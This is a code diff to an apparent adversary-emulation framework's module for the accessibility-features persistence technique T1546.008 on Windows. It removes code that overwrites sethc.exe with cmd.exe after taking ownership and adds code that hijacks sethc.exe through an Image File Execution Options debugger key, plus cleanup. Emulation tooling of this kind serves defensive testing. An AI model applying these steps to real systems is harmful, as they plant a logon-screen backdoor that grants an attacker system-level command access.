@@ -7,42 +7,50 @@ from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
 from purplestrike.techniques.connection import TargetConnection, get_connection
 
 logger = logging.getLogger(__name__)
-_backed_up_targets: set[str] = set()
+_created_targets: set[str] = set()
+
+_IFEO_KEY = (
+    "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
+    "Image File Execution Options\\sethc.exe"
+)
 
 
 async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
-    """Replace accessibility binary with cmd.exe for persistence."""
+    """Hijack sethc.exe through IFEO and trigger a benign marker command."""
     conn: TargetConnection | None = None
     try:
         conn = await get_connection(target)
-        backup_cmd = (
+        setup_cmd = (
             "$ErrorActionPreference = 'Stop'; "
-            "if (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe') "
-            "{ throw 'Previous accessibility backup exists; restore it before rerunning' }; "
-            "Get-Acl -LiteralPath 'C:\\Windows\\System32\\sethc.exe' | "
-            "Export-Clixml -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_acl.xml'; "
-            "Copy-Item -Path 'C:\\Windows\\System32\\sethc.exe' "
-            "-Destination 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' -Force"
+            f"if (Test-Path -LiteralPath '{_IFEO_KEY}') {{ "
+            "throw 'Existing sethc.exe IFEO configuration will not be overwritten' }; "
+            f"New-Item -Path '{_IFEO_KEY}' -Force | Out-Null; "
+            f"New-ItemProperty -Path '{_IFEO_KEY}' -Name 'Debugger' "
+            "-PropertyType String -Value 'cmd.exe /d /c \"echo "
+            "PurpleStrike-T1546.008>C:\\Windows\\Temp\\purplestrike_sethc.txt\"' "
+            "-ErrorAction Stop | Out-Null"
         )
-        backup = await conn.run_ps(backup_cmd)
-        if not backup.success:
-            raise RuntimeError(backup.stderr or backup.stdout or "Accessibility backup failed")
-        _backed_up_targets.add(target)
-        replace_cmd = (
-            "takeown /f C:\\Windows\\System32\\sethc.exe; "
-            "if ($LASTEXITCODE -ne 0) { throw 'Cannot take ownership of accessibility binary' }; "
-            "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F; "
-            "if ($LASTEXITCODE -ne 0) { throw 'Cannot update accessibility binary permissions' }; "
-            "Copy-Item -Path 'C:\\Windows\\System32\\cmd.exe' "
-            "-Destination 'C:\\Windows\\System32\\sethc.exe' -Force"
+        setup = await conn.run_ps(setup_cmd)
+        if not setup.success:
+            raise RuntimeError(setup.stderr or setup.stdout or "Accessibility IFEO setup failed")
+        _created_targets.add(target)
+        result = await conn.run_ps(
+            "$ErrorActionPreference = 'Stop'; "
+            "$marker = 'C:\\Windows\\Temp\\purplestrike_sethc.txt'; "
+            "[IO.File]::Delete($marker); "
+            "Start-Process -FilePath 'C:\\Windows\\System32\\sethc.exe' -Wait; "
+            "for ($i=0; $i -lt 20 -and !(Test-Path -LiteralPath $marker); $i++) "
+            "{ Start-Sleep -Milliseconds 250 }; "
+            "Get-Content -LiteralPath $marker -ErrorAction Stop"
         )
-        result = await conn.run_ps(replace_cmd)
         return TechniqueResult(
             technique_id="T1546.008",
             success=result.success,
             output=result.stdout[:4096],
             error=result.stderr[:1024] if not result.success else None,
             execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
+            artifacts=["C:\\Windows\\Temp\\purplestrike_sethc.txt"],
+            evidence=["The sethc.exe IFEO debugger executed and wrote its marker."],
         )
     except Exception as e:
         logger.error(f"T1546.008 execution failed: {e}")
@@ -61,24 +69,20 @@ async def cleanup(target: str) -> None:
     """Reverse any changes made during execution."""
     conn: TargetConnection | None = None
     try:
-        if target not in _backed_up_targets:
+        if target not in _created_targets:
             return
         conn = await get_connection(target)
-        restore_cmd = (
+        cleanup_cmd = (
             "$ErrorActionPreference = 'Stop'; "
-            "if (-not (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe')) "
-            "{ return }; "
-            "Copy-Item -Path 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' "
-            "-Destination 'C:\\Windows\\System32\\sethc.exe' -Force; "
-            "$acl = Import-Clixml -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_acl.xml'; "
-            "Set-Acl -LiteralPath 'C:\\Windows\\System32\\sethc.exe' -AclObject $acl; "
-            "Remove-Item -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe', "
-            "'C:\\Windows\\Temp\\purplestrike_sethc_acl.xml' -Force"
+            f"Remove-Item -LiteralPath '{_IFEO_KEY}' -Recurse -Force "
+            "-ErrorAction SilentlyContinue; "
+            "Remove-Item -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc.txt' "
+            "-Force -ErrorAction SilentlyContinue"
         )
-        restored = await conn.run_ps(restore_cmd)
-        if not restored.success:
-            raise RuntimeError(restored.stderr or restored.stdout or "Accessibility restore failed")
-        _backed_up_targets.discard(target)
+        removed = await conn.run_ps(cleanup_cmd)
+        if not removed.success:
+            raise RuntimeError(removed.stderr or removed.stdout or "Accessibility cleanup failed")
+        _created_targets.discard(target)
     except Exception as e:
         logger.warning(f"T1546.008 cleanup failed: {e}")
     finally:
